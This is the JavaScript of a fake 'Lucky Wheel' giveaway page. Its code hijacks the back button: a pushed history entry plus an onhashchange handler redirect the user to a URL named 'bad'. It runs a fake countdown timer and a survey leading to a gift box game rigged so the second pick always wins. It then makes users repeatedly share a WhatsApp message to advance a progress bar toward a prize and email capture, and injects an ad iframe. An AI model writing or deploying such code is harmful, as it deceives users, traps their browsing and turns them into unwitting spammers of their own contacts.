
function set_Cookie(name, value) {
    name = "azh" + name;
    var Days = 5;
    var exp = new Date();
    exp.setTime(exp.getTime() + (Days * 3600*24 * 1000));
    document.cookie = name + "=" + escape(value) + ";expires=" + exp.toGMTString() + "; path=/;"
}

function get_Cookie(name) {
    name = "azh" + name;
    var arr, reg = new RegExp("(^| )" + name + "=([^;]*)(;|$)");
    if (arr = document.cookie.match(reg)) {
        return unescape(arr[2]);
    }
    return '';
}

function getQueryString(name) {
    var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');
    var r = window.location.search.substr(1).match(reg);
    if (r != null) {
        return unescape(r[2]);
    }
    return null;
}

function spinnerAction() {
    //alert("Welcome to Lucky Wheel!Spin the Wheel and you may win exclusive prizes!Click OK to Start the Game!")
}


window.onhashchange = function () {
    jp();
};

function hh1() {
    history.pushState(history.length + 1, "message", "#" + new Date().getTime());
}

function jp() {
    fh();
}

setTimeout('hh1();', 500);

function fh() {
    location.href = bad;
}

function wxalert(t, n, b, flag, i) {
    //flag:1,success  2,normal
    var r, u;
    r = '<div class="weui_dialog_alert" style="position: fixed; z-index: 1000; display: none;margin-left:15%;margin-right:15%">';
    r += '<div class="weui_mask"></div>';
    r += '<div class="weui_dialog">';
    r += '<i class="weui_close"><svg t="1540783423798" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="s="http://www.w3.org/2000/svg" p-" p-id="1931" xmlns:xlink="k="http://www.w3.org/1999/xlink" wi" width="25" height="25"><path style="fill:#666;" d="M176.661601 817.172881C168.472798 825.644055 168.701706 839.149636 177.172881 847.338438 185.644056 855.527241 199.149636 855.298332 207.338438 846.827157L826.005105 206.827157C834.193907 198.355983 833.964998 184.850403 825.493824 176.661601 817.02265 168.472798 803.517069 168.701706 795.328267 177.172881L176.661601 817.172881ZM795.328267 846.827157C803.517069 855.298332 817.02265 855.527241 825.493824 847.338438 833.964998 839.149636 834.193907 825.644055 826.005105 817.172881L207.338438 177.172881C199.149636 168.701706 185.644056 168.472798 177.172881 176.661601 168.701706 184.850403 168.472798 198.355983 176.661601 206.827157L795.328267 846.827157Z" p-id="1932"></path></svg></i>';
    r += '<div class="weui_dialog_hd"><strong class="weui_dialog_title"></strong></div>';
    r += '<div class="weui_dialog_bd" style="color:#000;padding-top:20px;padding-bottom:10px;"></div>';
    r += '<div class="weui_dialog_ft">';
    r += '<div href="javascript:void(0);" class="weui_btn_dialog primary btn">OK</div>';
    r += "</div>";
    r += "</div>";
    r += "</div>";

    $(".weui_dialog_alert").length > 0 ? $(".weui_dialog_alert .weui_dialog_bd").empty() : $("body").append($(r));
    setTimeout(function () {
        u = $(".weui_dialog_alert");
        u.show();
        u.find(".weui_dialog_bd").html(n);
        u.find(".weui_dialog_title").html(t);
        u.find(".weui_btn_dialog").html(b ? b : "");
        u.find(".weui_btn_dialog").off("click").on("click", function () {
            i();
            u.hide();
            if (flag == 1) {
                stopConfetti();
            }
        });
        u.find(".weui_close").off("click").on("click", function () {
            i();
            u.hide();
            if (flag == 1) {
                stopConfetti();
            }
        });
        if (flag == 1) {
            startConfetti();
        }
    }, 500);
}

var maxParticleCount = 150;
var particleSpeed = 2;
var startConfetti;
var stopConfetti;
var toggleConfetti;
var removeConfetti;
(function () {
    startConfetti = startConfettiInner;
    stopConfetti = stopConfettiInner;
    toggleConfetti = toggleConfettiInner;
    removeConfetti = removeConfettiInner;
    var colors = ["DodgerBlue", "OliveDrab", "Gold", "Pink", "SlateBlue", "LightBlue", "Violet", "PaleGreen", "SteelBlue", "SandyBrown", "Chocolate", "Crimson"]
    var streamingConfetti = false;
    var animationTimer = null;
    var particles = [];
    var waveAngle = 0;

    function resetParticle(particle, width, height) {
        particle.color = colors[(Math.random() * colors.length) | 0];
        particle.x = Math.random() * width;
        particle.y = Math.random() * height - height;
        particle.diameter = Math.random() * 10 + 5;
        particle.tilt = Math.random() * 10 - 10;
        particle.tiltAngleIncrement = Math.random() * 0.07 + 0.05;
        particle.tiltAngle = 0;
        return particle;
    }

    function startConfettiInner() {
        var width = window.innerWidth;
        var height = window.innerHeight;
        window.requestAnimFrame = (function () {
            return window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame || function (callback) {
                return window.setTimeout(callback, 16.6666667);
            };
        })();
        var canvas = document.getElementById("confetti-canvas");
        if (canvas === null) {
            canvas = document.createElement("canvas");
            canvas.setAttribute("id", "confetti-canvas");
            canvas.setAttribute("style", "display:block;z-index:999999;pointer-events:none;position: absolute;left: 0px;top: 0px;");
            document.body.appendChild(canvas);
            canvas.width = width;
            canvas.height = height;
            window.addEventListener("resize", function () {
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
            }, true);
        }
        var context = canvas.getContext("2d");
        while (particles.length < maxParticleCount)
            particles.push(resetParticle({}, width, height));
        streamingConfetti = true;
        if (animationTimer === null) {
            (function runAnimation() {
                context.clearRect(0, 0, window.innerWidth, window.innerHeight);
                if (particles.length === 0)
                    animationTimer = null; else {
                    updateParticles();
                    drawParticles(context);
                    animationTimer = requestAnimFrame(runAnimation);
                }
            })();
        }
    }

    function stopConfettiInner() {
        streamingConfetti = false;
    }

    function removeConfettiInner() {
        stopConfetti();
        particles = [];
    }

    function toggleConfettiInner() {
        if (streamingConfetti)
            stopConfettiInner(); else
            startConfettiInner();
    }

    function drawParticles(context) {
        var particle;
        var x;
        for (var i = 0; i < particles.length; i++) {
            particle = particles[i];
            context.beginPath();
            context.lineWidth = particle.diameter;
            context.strokeStyle = particle.color;
            x = particle.x + particle.tilt;
            context.moveTo(x + particle.diameter / 2, particle.y);
            context.lineTo(x, particle.y + particle.tilt + particle.diameter / 2);
            context.stroke();
        }
    }

    function updateParticles() {
        var width = window.innerWidth;
        var height = window.innerHeight;
        var particle;
        waveAngle += 0.01;
        for (var i = 0; i < particles.length; i++) {
            particle = particles[i];
            if (!streamingConfetti && particle.y < -15)
                particle.y = height + 100; else {
                particle.tiltAngle += particle.tiltAngleIncrement;
                particle.x += Math.sin(waveAngle);
                particle.y += (Math.cos(waveAngle) + particle.diameter + particleSpeed) * 0.5;
                particle.tilt = Math.sin(particle.tiltAngle) * 15;
            }
            if (particle.x > width + 20 || particle.x < -20 || particle.y > height) {
                if (streamingConfetti && particles.length <= maxParticleCount)
                    resetParticle(particle, width, height); else {
                    particles.splice(i, 1);
                    i--;
                }
            }
        }
    }
})();

function getBrowser() {
    if ((navigator.userAgent.indexOf("Opera") || navigator.userAgent.indexOf("OPR")) != -1) {
        return "Opera";
    } else {
        if (navigator.userAgent.indexOf("Chrome") != -1) {
            return "Google Chrome";
        } else {
            if (navigator.userAgent.indexOf("Safari") != -1) {
                return "Safari";
            } else {
                if (navigator.userAgent.indexOf("Firefox") != -1) {
                    return "Firefox";
                } else {
                    if ((navigator.userAgent.indexOf("MSIE") != -1) || (!!document.documentMode == true)) {
                        return "IE";
                    } else {
                        return "Unknown";
                    }
                }
            }
        }
    }
    return "Unknown";
}

function getPlatform() {
    if (window.navigator.userAgent.indexOf("Windows NT 10.0") != -1) {
        return "Windows 10";
    }
    if (window.navigator.userAgent.indexOf("Windows NT 6.2") != -1) {
        return "Windows 8";
    }
    if (window.navigator.userAgent.indexOf("Windows NT 6.1") != -1) {
        return "Windows 7";
    }
    if (window.navigator.userAgent.indexOf("Windows NT 6.0") != -1) {
        return "Windows Vista";
    }
    if (window.navigator.userAgent.indexOf("Windows NT 5.1") != -1) {
        return "Windows XP";
    }
    if (window.navigator.userAgent.indexOf("Windows NT 5.0") != -1) {
        return "Windows 2000";
    }
    if (window.navigator.userAgent.indexOf("iPhone") != -1) {
        return "iPhone";
    }
    if (window.navigator.userAgent.indexOf("iPad") != -1) {
        return "iPad";
    }
    if (window.navigator.userAgent.indexOf("Android") != -1) {
        return "Android";
    }
    if (window.navigator.userAgent.indexOf("Mac") != -1) {
        return "Macintosh";
    }
    if (window.navigator.userAgent.indexOf("X11") != -1) {
        return "UNIX";
    }
    if (window.navigator.userAgent.indexOf("Linux") != -1) {
        return "Linux";
    }
    if (window.navigator.userAgent.indexOf("BlackBerry") != -1) {
        return "BlackBerry";
    }
    return "Unknown";
}

jQuery(document).ready(function () {
    function d(h) {
        var j, k, i = h, g = setInterval(function () {
            j = parseInt(i / 60, 10), k = parseInt(i % 60, 10), k = 10 > k ? "0" + k : k, $("#timerr").text(j + " " + minutos_y + k + " " + segundos), --i < 0 && (clearInterval(g));
        }, 1000);
    }

    if (jQuery("#timerr").length >= 1) {
        d((4 * 60) + 29);
    }

    function f(g) {
        if (g < 10) {
            g = "0" + g;
        }
        return g;
    }

    var b = new Date();
    var a = f(b.getHours()) + ":" + f(b.getMinutes());
    jQuery(".p_var-dia").text(b.getDate());
    jQuery(".p_var-mes").text(b.getMonth());
    jQuery(".p_var-anyo").text(b.getFullYear());
    jQuery(".p_var-dia_nombre").text(dayNames[b.getDay()]);
    jQuery(".p_var-mes_nombre").text(monthNames[b.getMonth()]);
    jQuery(".p_var-hora_fija").text(a);
    if (jQuery(".p_var-browser").length >= 1) {
        var c = getBrowser();
        jQuery(".p_var-browser").text(c);
    }
    if (jQuery(".p_var-browser").length >= 1) {
        var e = getPlatform();
        jQuery(".p_var-so").text(e);
    }
});


$(document).ready(function () {

    var qkey = Object.keys(ques)
    var count_ques = qkey.length
    var ans = 0;

    $(document).on('click', '.survey_button', function () {
        ans++

        if (ans == count_ques) {
            //问卷完成
            $('.survey').hide()
            $('#header__hideble-content').hide()
            showGame()
            return
        }
        cquestion(ques, qkey, ans)


    })

    function cquestion(ques, qkey, ans) {
        $('.question').fadeOut("slow", function () {
            $(this).html("<strong>" + ques[qkey[ans]][0] + ":</strong>" + ques[qkey[ans]][1]).fadeIn("slow")
        })
        var ahtml = ''
        for (k in ques[qkey[ans]]) {
            if (k < 2) {
                continue;
            }
            ahtml += '<div class="survey_button">' + ques[qkey[ans]][k] + '</div>\n'
        }

        $('.choose').fadeOut("slow", function () {
            $(this).html(ahtml).fadeIn("slow")
        })

    }

    function showGame() {
        scrollTo("id1"), $("#content0").fadeOut("slow", function () {
            $("#content2").fadeIn(), setTimeout(function () {
                $("#result1").fadeIn(1e3)
            }, 3e3), setTimeout(function () {
                $("#result2").fadeIn(1e3)
            }, 4100), setTimeout(function () {
                $("#result3").fadeIn(1e3)
            }, 6e3), setTimeout(function () {
                $("#content2").fadeOut("slow", function () {
                    "undefined" != typeof roulette_ini ? rouletteRoot._init() : "undefined" != typeof box_ini && boxRoot._init(), $("#content3").fadeIn()
                })
            }, 7100)
        })
    }

    function scrollTo(a) {
        if ($("#" + a).length) {
            var c = $("#" + a).offset();
            var b = c.top;
            $("html,body").animate({scrollTop: b}, {duration: "slow"});
        }
    }
})

var box_ini = !1
var modalOptions = {
    backdrop: 'static',
    keyboard: false
};
var count = 1;
var intentos = 3;
var puedo = false;
var boxRoot;
(function () {
    "use strict";
    boxRoot = {
        _init: function () {
            setTimeout(function () {
                jQuery('#p_modal1').modal(modalOptions);
            }, 1000);
            jQuery('.try').on('click', function () {
                if (puedo && count <= intentos) {
                    if (jQuery(this).hasClass('abierta')) {
                    } else {
                        puedo = false;
                        jQuery('.circle-loader').removeClass("load-complete");
                        jQuery('.checkmark').css("display", "none");
                        jQuery(this).addClass('abierta');
                        if (count == 2) {
                            jQuery(this).addClass('premiazo');
                            setTimeout(function () {
                                jQuery(".div_img_gift, .img_gift").fadeIn("slow", function () {
                                    setTimeout(function () {
                                        startConfetti();
                                        jQuery('#p_modal3').modal(modalOptions);
                                        jQuery('.circle-loader').addClass("load-complete");
                                        jQuery('.checkmark').css("display", "block");
                                    }, 1500);
                                });
                            }, 4000);
                        } else {
                            count++;
                            intentos--;
                            jQuery('#num_intentos').html(intentos);
                            setTimeout(function () {
                                jQuery('#p_modal2').modal(modalOptions);
                                setTimeout(function () {
                                    jQuery('.circle-loader').addClass("load-complete");
                                    jQuery('.checkmark').css("display", "block");
                                    puedo = true;
                                }, 1000);
                            }, 2000);
                        }
                    }
                }
            });
            jQuery("#p_modal_button1").on("click", function (event) {
                event.stopPropagation();
                jQuery('#p_modal1').modal('hide');
                puedo = true;
            });
            jQuery("#p_modal_button2").on("click", function (event) {
                event.stopPropagation();
                jQuery('#p_modal2').modal('hide');
            });
        }
    };
    jQuery(document).ready(function () {
        if (typeof box_ini == "undefined") {
            boxRoot._init();
        }
    });
})();



function showShare() {
    set_Cookie('type_op', 2)
    jQuery('#p_modal3').modal('hide');
    $('#content4').show();
    $('#content3').hide();
    $('#content2').hide();
    $('#content1').hide();
    $('#content0').hide();
}

$(function () {
    var typeop = parseInt(get_Cookie('type_op'));
    if (typeop == 2) {
        showShare()
    }
    if (get_Cookie('prog')) {
        setTimeout(function () {
            $(".hide-all").hide();
            $(".show-all").show();
            incrementValue_a();
            fn1_a();
            chooseApp(1);

            if (get_Cookie("appName") != "") {
                appName = get_Cookie("appName");
            }
            $(".appName").html(appName);
            $("#sw_bn").html(appName);
            tipnstr = tipnstr.replace(/NNN/g, appName);
            // document.getElementById("buttonO").style.display="block";
            // document.getElementById("selectdiv").style.display="none";

        }, 200)
    }
})


function fn1_a() {

    v = parseInt(get_Cookie('prog')) - 1;
    document.querySelector('#progressbar').style['display'] = "block";
    ob=0;
    v == '0' ? ob = 30 : v == '1' ? ob = 50 : v == '2' ? ob = 52 : v == '3' ? ob = 60 : v == '4' ? ob = 60 :
        v == '5' ? ob = 65 : v == '6' ? ob = 70 : v == '7' ? ob = 80 : v == '8' ? ob = 85 : v == '9' ? ob = 90 :
            v == '10' ? ob = 96 : v == '11' ? ob = 98 : v == '12' ? ob = 100 : void (0);
    document.querySelector('#progressbar').style['width'] = ob + "%";
    document.querySelector('#progressbar').style['width'] = ob + "%";
    document.querySelector('#progressbar').textContent = ob + "%";

}

function emailIsValid (email) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)
}

function incrementValue_a() {


    value = parseInt(get_Cookie('prog')) - 1;
    if (value == 2 || value == 4) {
        wxalert("", alertTip, "OK", 2, function () {
        });
    }


    if (value >= 12) {
        lasthtml();
    }
}

function chooseApp(type) {
    if (type == 1) {
        appName = "Whatsapp";
    } else {
        appName = "Line";
    }
    set_Cookie("appName", appName);
    $(".appName").html(appName);
    $("#sw_bn").html(appName);
    tipnstr = tipnstr.replace(/NNN/g, appName);
    // document.getElementById("buttonO").style.display="block";
    // document.getElementById("selectdiv").style.display="none";
}

j = '';
banner = '';

function incrementValue1() {
    var tiaoban1 = tiaoban;
    if (parseInt(get_Cookie('prog')) > 100) {
        window.open('whatsapp://send?text=' + tiaoban1);
    } else {
        window.open('whatsapp://send?text=' + tiaoban1);
    }
    setTimeout(function () {
        incrementValue_i();
        fn1_i();
        value = parseInt(get_Cookie('prog'));
        if (value > 3 && g_banner_ad == true) {
            var qs = 'https://uprimp.com/bnr_xload.php?section=General&pub=628865&format=300x250&ga=g&xt=161795234373025&xtt=' + Math.round(Math.random() * 10000000)
            jQuery("#banner_ad_share").html('<iframe src="'+qs+'" width="300" height="250" frameborder="0" marginheight="0" marginwidth="0" scrolling="no" sandbox="allow-forms allow-pointer-lock allow-popups allow-same-origin allow-scripts"><\/iframe>')
            g_banner_ad = false
        }
        set_Cookie('prog', value + 1);
    }, 2000);
}

function incrementValue_i() {
    get_Cookie('prog') == '' ? value = 0 : value = get_Cookie('prog');
    if (value == 2 || value == 4) {
        wxalert("", alertTip, "OK", 2, function () {
        });
    }
    set_Cookie('prog', value);
    if (value >= 12) {
        lasthtml();
    }
}

function fn1_i() {
    v = get_Cookie('prog');
    document.querySelector('#progressbar').style['display'] = "block";
    v == '0' ? ob = 30 : v == '1' ? ob = 50 : v == '2' ? ob = 52 : v == '3' ? ob = 60 : v == '4' ? ob = 60 : v == '5' ? ob = 65 : v == '6' ? ob = 70 : v == '7' ? ob = 80 : v == '8' ? ob = 85 : v == '9' ? ob = 90 : v == '10' ? ob = 96 : v == '11' ? ob = 98 : v == '12' ? ob = 100 : void (0);
    document.querySelector('#progressbar').style['width'] = ob + "%";
    document.querySelector('#progressbar').style['width'] = ob + "%";
    document.querySelector('#progressbar').textContent = ob + "%";

}

function lasthtml() {
    tmpMail=get_Cookie('email');
    if(tmpMail && emailIsValid(tmpMail)){
        $('#email-in').val(tmpMail);
        dapp(0);
    }
    // html="";
    // document.getElementById("lastapp").innerHTML = html;
    document.getElementById("buttonl").style.display = 'none';
    document.getElementById("button2").style.display = 'block';
}



function tipn() {
    wxalert("", tipnstr, "OK", 2, function () {
    });
}
